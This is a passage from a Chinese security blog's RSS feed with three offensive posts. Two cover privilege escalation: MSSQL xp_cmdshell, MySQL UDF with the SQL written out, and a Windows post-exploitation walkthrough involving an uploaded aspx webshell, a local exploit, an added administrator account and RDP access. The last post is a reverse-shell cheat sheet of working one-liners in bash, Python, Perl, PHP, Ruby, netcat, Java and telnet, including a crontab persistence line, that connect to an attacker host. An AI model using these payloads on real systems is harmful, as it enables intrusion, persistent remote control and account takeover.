&lt;h4 id=&#34;连接数据库:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;连接数据库&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_find_sql_conn_msg.png&#34; alt=&#34;Windows下第三方服务提权-找数据库连接信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_conn_mssql.png&#34; alt=&#34;Windows下第三方服务提权-连接mssql数据库&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;执行系统命令:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;执行系统命令&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_exec_sys_command.png&#34; alt=&#34;Windows下第三方服务提权-尝试用xp_cmdshell执行命令&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_cmd_shell.png&#34; alt=&#34;Windows下第三方服务提权-开启xp_cmdshell组件&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_exec_sys_command_success.png&#34; alt=&#34;Windows下第三方服务提权-使用xp_cmdshell成功执行命令&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;添加用户:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;添加用户&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_add_user.png&#34; alt=&#34;Windows下第三方服务提权-添加用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_user.png&#34; alt=&#34;Windows下第三方服务提权-查看添加的用户&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;远程连接:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;远程连接&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_conn.png&#34; alt=&#34;Windows下第三方服务提权-远程连接&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_input_u_p.png&#34; alt=&#34;Windows下第三方服务提权-输入用户名和密码&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_view_ip.png&#34; alt=&#34;Windows下第三方服务提权-输入用户名和密码&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&#34;mysql提权:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;MySQL提权&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;环境：web应用服务器权限较低&lt;br /&gt;
提权条件：MySQL是system权限&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;关于udf:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;关于UDF&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;udf提权过程:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;UDF提权过程&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;导入udf.dll到服务器指定目录&lt;br /&gt;

&lt;ul&gt;
&lt;li&gt;MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用SQL语句创建功能函数&lt;br /&gt;
CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;执行MySQL语句调用新创建的函数&lt;br /&gt;
select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;);&lt;/li&gt;
&lt;li&gt;删除创建的函数&lt;br /&gt;
drop function shell;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;查看基本信息:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;查看基本信息&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_base_msg.png&#34; alt=&#34;Windows下第三方服务提权-查看基本信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_current_user.png&#34; alt=&#34;Windows下第三方服务提权-查看当前用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_current_user_permissions.png&#34; alt=&#34;Windows下第三方服务提权-查看当前用户权限&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;上传udf提权:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;上传udf提权&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_udf.png&#34; alt=&#34;Windows下第三方服务提权-上传udf&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_conn_mysql.png&#34; alt=&#34;Windows下第三方服务提权-连接数据库&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_export_udf.png&#34; alt=&#34;Windows下第三方服务提权-导出udf.dll并生成函数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_exec_whoami.png&#34; alt=&#34;Windows下第三方服务提权-提权成功执行whoami&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;添加用户-1:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;添加用户&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_add_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数添加用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_add_user_to_administrators.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数添加用户到管理员组&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_active_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数激活用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_view_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数查看用户&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;远程连接-1:138d8bfd13dc206a8cdf346aa048c60c&#34;&gt;远程连接&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_remote_connection.png&#34; alt=&#34;Windows下第三方服务提权-远程3389连接&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Windows下系统漏洞提权</title>
      <link>http://wyb0.com/posts/Windows%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Windows%E4%B8%8B%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</guid>
      <description>

&lt;p&gt;提权是在已经getshell但是权限不大的前提下做的&lt;/p&gt;

&lt;h3 id=&#34;0x00-查看基本信息:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x00 查看基本信息&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_msg1.png&#34; alt=&#34;Windows系统漏洞提权-查看基本信息1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_msg2.png&#34; alt=&#34;Windows系统漏洞提权-查看基本信息2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-使用cmd执行命令:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x01 使用cmd执行命令&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;尝试使用cmd执行命令

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd.png&#34; alt=&#34;Windows系统漏洞提权-尝试使用cmd执行命令&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;找可写目录

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_find_wirteable_dir.png&#34; alt=&#34;Windows系统漏洞提权-找可写目录&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;尝试上传cmd.exe

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_upload_cmd.png&#34; alt=&#34;Windows系统漏洞提权-尝试上传cmd&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;写一个aspx马

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_write_aspx.png&#34; alt=&#34;Windows系统漏洞提权-写一个aspx马&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_aspx.png&#34; alt=&#34;Windows系统漏洞提权-查看aspx马&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;上传cmd.exe

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_cmd.png&#34; alt=&#34;Windows系统漏洞提权-上传cmd&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_cmd.png&#34; alt=&#34;Windows系统漏洞提权-查看上传的cmd&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;再次尝试使用cmd执行命令

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd_again1.png&#34; alt=&#34;Windows系统漏洞提权-再次尝试使用cmd执行命令1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_use_cmd_again2.png&#34; alt=&#34;Windows系统漏洞提权-再次尝试使用cmd执行命令2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-权限提升:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x02 权限提升&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;查看未安装补丁

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_patch.png&#34; alt=&#34;Windows系统漏洞提权-查看系统未安装补丁&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;上传exp提权

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_iis6.png&#34; alt=&#34;Windows系统漏洞提权-上传iis6&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_run_iis6_1.png&#34; alt=&#34;Windows系统漏洞提权-第一次运行iis6&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_run_iis6_2.png&#34; alt=&#34;Windows系统漏洞提权-再次运行iis6&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-添加用户:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x03 添加用户&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;添加远程连接用户

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_use_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-使用系统自带的帮助用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_sys_help_user_add_pwd.png&#34; alt=&#34;Windows系统漏洞提权-为系统自带的帮助用户添加密码&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_sys_help_user_add_administrators.png&#34; alt=&#34;Windows系统漏洞提权-将系统自带的帮助用户添加到管理员组&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_active_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-启用系统自带的帮助用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_sys_help_user.png&#34; alt=&#34;Windows系统漏洞提权-查看系统自带的帮助用户现在的权限信息&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x04-使用3389远程连接:bbe646d65ad478764ffe4172ed833724&#34;&gt;0x04 使用3389远程连接&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_ip.png&#34; alt=&#34;Windows系统漏洞提权-查看ip信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection.png&#34; alt=&#34;Windows系统漏洞提权-远程连接&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_input_pwd.png&#34; alt=&#34;Windows系统漏洞提权-远程连接输入用户名密码&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_success.png&#34; alt=&#34;Windows系统漏洞提权-远程连接成功&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下反弹shell</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</guid>
      <description>

&lt;p&gt;当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令&lt;/p&gt;

&lt;h3 id=&#34;0x00-bash:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x00 Bash&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1
注：这个由解析shell的bash完成，有些时候不支持
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x01-crontab:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x01 crontab&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;下面这条命令执行后会每隔30分钟反弹一次：
(crontab -l;printf &amp;quot;*/30 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/10.10.10.10/8888;exec 0&amp;lt;&amp;amp;9;
exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&amp;quot;)|
crontab -
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x02-python:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x02 Python&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# 下面为1条命令
python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect((&amp;quot;10.10.10.10&amp;quot;,8888));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x03-perl:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x03 Perl&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
perl -e &#39;use Socket;$i=&amp;quot;10.10.10.10&amp;quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x04-php:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x04 PHP&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;10.10.10.10&amp;quot;,8888);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x05-ruby:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x05 Ruby&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为1条命令
ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;10.10.10.10&amp;quot;,8888).to_i;
exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x06-netcat:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x06 Netcat&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;nc -e /bin/sh 10.10.10.10 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x07-java:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x07 Java&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;# 下面为3条命令
r = Runtime.getRuntime()
p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.10.10.10/8888;cat &amp;lt;&amp;amp;5 | 
while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;0x08-telnet:f4c07bc8b06e5fd51bb4881d5a9280c7&#34;&gt;0x08 telnet&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;两种方法：
mknod backpipe p &amp;amp;&amp;amp; telnet 173.214.173.151 8080 0backpipe
telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
第一种hacker运行：nc -vlp 8080
第二种hacker运行：nc -vlp 8080和nc -vlp 8888
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
参考文章：&lt;br /&gt;
&lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.91ri.org/6620.html&#34;&gt;https://www.91ri.org/6620.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>